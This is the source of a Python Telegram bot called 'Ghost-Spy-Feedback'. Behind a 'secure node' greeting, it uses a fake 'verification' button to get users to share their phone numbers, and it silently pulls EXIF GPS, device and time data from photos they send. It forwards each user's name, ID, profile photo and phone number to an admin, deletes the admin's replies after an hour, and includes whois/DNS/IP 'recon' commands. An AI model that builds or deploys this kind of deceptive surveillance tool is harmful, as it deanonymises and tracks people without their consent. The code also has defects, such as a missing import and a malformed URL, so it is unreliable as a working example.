import telebot
from telebot import types
import re
import time
import threading
import whois
import socket
import requests
import io
from PIL import Image
from PIL.ExifTags import TAGS
from datetime import datetime

# --- CONFIG ---
API_TOKEN = 'ТВОЙ_ТОКЕН_БОТА'
bot = telebot.TeleBot(API_TOKEN, parse_mode='HTML')
ADMIN_ID = 8316825610  
BLACK_LIST_FILE = "blacklist.txt"

# Память для удаления приветствий
pending_welcome = {}

# --- СИСТЕМА БАНА ---
def get_blacklist():
    if not os.path.exists(BLACK_LIST_FILE): return []
    with open(BLACK_LIST_FILE, "r") as f:
        return [line.strip() for line in f]

def add_to_blacklist(user_id):
    with open(BLACK_LIST_FILE, "a") as f:
        f.write(f"{user_id}\n")

def remove_from_blacklist(user_id):
    ids = get_blacklist()
    if str(user_id) in ids:
        ids.remove(str(user_id))
        with open(BLACK_LIST_FILE, "w") as f:
            for i in ids: f.write(f"{i}\n")
        return True
    return False

# --- СТИЛИЗОВАННАЯ ДАТА ---
def get_styled_date():
    now = time.asctime()
    return f"<span style='color: #0f0;'>Date</span><span style='color: #f00;'>:</span><span style='color: #ff0;'>{now}</span>"

# --- СИСТЕМА ПРИЗРАКА ---
def delete_later(chat_id, message_id, delay=3600):
    def s_delete():
        time.sleep(delay)
        try: bot.delete_message(chat_id, message_id)
        except: pass
    threading.Thread(target=s_delete).start()

def cleanup(chat_id):
    if chat_id in pending_welcome:
        try:
            bot.delete_message(chat_id, pending_welcome[chat_id])
            del pending_welcome[chat_id]
        except: pass

# --- КОМАНДЫ АДМИНА (BAN / UNBAN / RECON) ---
@bot.message_handler(commands=['ban'])
def ban_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        user_id = message.text.split()[1]
        add_to_blacklist(user_id)
        bot.reply_to(message, f"⛔️ <b>ID {user_id} заблокирован.</b> Сигналы от него приниматься не будут.")
    except: bot.reply_to(message, "Пример: <code>/ban 12345678</code>")

@bot.message_handler(commands=['dban']) # По твоему запросу dban
def unban_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        user_id = message.text.split()[1]
        if remove_from_blacklist(user_id):
            bot.reply_to(message, f"✅ <b>ID {user_id} разблокирован.</b>")
        else:
            bot.reply_to(message, "ID не найден в черном списке.")
    except: bot.reply_to(message, "Пример: <code>/dban 12345678</code>")

@bot.message_handler(commands=['whois', 'dns', 'ip'])
def recon_ops(message):
    if message.from_user.id != ADMIN_ID: return
    cmd_parts = message.text.split()
    if len(cmd_parts) < 2: return
    cmd = cmd_parts[0]
    query = cmd_parts[1]
    
    res = "Processing..."
    try:
        if 'whois' in cmd:
            w = whois.whois(query)
            res = f"REGISTRAR: {w.registrar}\nCOUNTRY: {w.country}"
        elif 'dns' in cmd:
            res = f"IP: {socket.gethostbyname(query)}"
        elif 'ip' in cmd:
            res = requests.get(f"http://ip-api.com{query}").json().get('as', 'Error')
        bot.send_message(ADMIN_ID, f"<b>[ RECON ]</b>\n<code>{res}</code>\n{get_styled_date()}")
    except Exception as e: bot.send_message(ADMIN_ID, f"❌ Error: {e}")

# --- ПРИЕМ СИГНАЛОВ (С ПРОВЕРКОЙ БАНА) ---
@bot.message_handler(content_types=['text', 'photo', 'contact'])
def master_handler(message):
    user_id = message.from_user.id
    
    # Игнор если в бане
    if str(user_id) in get_blacklist(): return

    # Логика для админа (Ответ на сообщения)
    if user_id == ADMIN_ID:
        if message.reply_to_message:
            try:
                caption = message.reply_to_message.caption or message.reply_to_message.text
                target_id = int(re.search(r'ID: (\d+)', caption).group(1))
                sent = bot.send_message(target_id, f"✉️ <b>ОТВЕТ АНАЛИТИКА:</b>\n{message.text}")
                delete_later(target_id, sent.message_id)
                bot.send_message(ADMIN_ID, f"✅ Ответ отправлен объекту {target_id}. (Удалится через 1ч)")
            except: bot.send_message(ADMIN_ID, "❌ Ошибка: не найден ID в сообщении.")
        return

    # Логика для пользователей
    cleanup(message.chat.id)
    label = "📩 ВХОДЯЩИЙ СИГНАЛ"
    extra = ""
    photo_id = None

    if message.content_type == 'contact':
        label = "🚨 ОБЪЕКТ РАСКРЫЛ НОМЕР"
        extra = f"Phone: <code>+{message.contact.phone_number}</code>"
    elif message.content_type == 'photo':
        label = "📸 ФОТО + EXIF"
        photo_id = message.photo[-1].file_id
        file_info = bot.get_file(photo_id)
        downloaded = bot.download_file(file_info.file_path)
        # Exif анализ в памяти
        try:
            img = Image.open(io.BytesIO(downloaded))
            exif = img._getexif()
            if exif:
                meta = [f"{TAGS.get(t,t)}: {v}" for t,v in exif.items() if TAGS.get(t) in ['Model', 'Software', 'DateTime', 'GPSInfo']]
                extra = "EXIF: " + ", ".join(meta)
            else: extra = "EXIF: Clean"
        except: extra = "EXIF: Error"
        extra += f"\nText: {message.caption or 'None'}"
    else:
        extra = f"Text: {message.text}"

    report = (
        f"<b>{label}</b>\n────────────────────────\n"
        f"<b>Name:</b> <code>{message.from_user.first_name}</code>\n"
        f"<b>User:</b> <code>@{message.from_user.username or 'unknown'}</code>\n"
        f"<b>ID:</b> <code>{user_id}</code>\n"
        f"────────────────────────\n"
        f"{extra}\n"
        f"────────────────────────\n"
        f"{get_styled_date()}"
    )

    # Отправка админу с аватаркой
    try:
        if photo_id:
            bot.send_photo(ADMIN_ID, photo_id, caption=report)
        else:
            photos = bot.get_user_profile_photos(user_id)
            if photos.total_count > 0:
                bot.send_photo(ADMIN_ID, photos.photos[0][-1].file_id, caption=report)
            else: bot.send_message(ADMIN_ID, report)
    except: bot.send_message(ADMIN_ID, report)
    
    bot.reply_to(message, "✅ <b>Сигнал получен.</b>")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if str(message.from_user.id) in get_blacklist(): return
    cleanup(message.chat.id)
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("🛡 Пройти верификацию", request_contact=True))
    msg = bot.send_message(message.chat.id, "<b>[ SECURE NODE ]</b>\nОтправьте сообщение для связи:", reply_markup=markup)
    pending_welcome[message.chat.id] = msg.message_id

if __name__ == '__main__':
    import os
    print("Ghost-Spy-Feedback v6.0 Active...")
    bot.polling(none_stop=True)
